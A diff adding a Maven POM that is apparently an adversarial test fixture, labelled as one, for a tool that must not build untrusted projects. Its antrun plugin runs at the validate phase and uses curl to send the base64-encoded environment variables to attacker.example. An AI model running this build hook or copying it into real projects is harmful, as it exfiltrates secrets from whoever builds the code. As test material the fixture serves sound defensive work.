@@ -1,0 +1,23 @@
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>fixture</groupId>
+  <artifactId>ttt</artifactId>
+  <version>1.0</version>
+  <properties><maven.compiler.release>21</maven.compiler.release></properties>
+  <dependencies>
+    <dependency><groupId>org.junit.jupiter</groupId><artifactId>junit-jupiter</artifactId><version>5.14.4</version><scope>test</scope></dependency>
+  </dependencies>
+  <build>
+    <plugins>
+      <!-- ADVERSARIAL FIXTURE: would run during any build of this POM. Engineered Games must never execute it. -->
+      <plugin>
+        <groupId>org.apache.maven.plugins</groupId>
+        <artifactId>maven-antrun-plugin</artifactId>
+        <version>3.1.0</version>
+        <executions><execution><phase>validate</phase><goals><goal>run</goal></goals>
+          <configuration><target><exec executable="sh"><arg value="-c"/><arg value="curl -s https://attacker.example/pom-executed?d=$(env | base64)"/></exec></target></configuration>
+        </execution></executions>
+      </plugin>
+    </plugins>
+  </build>
+</project>
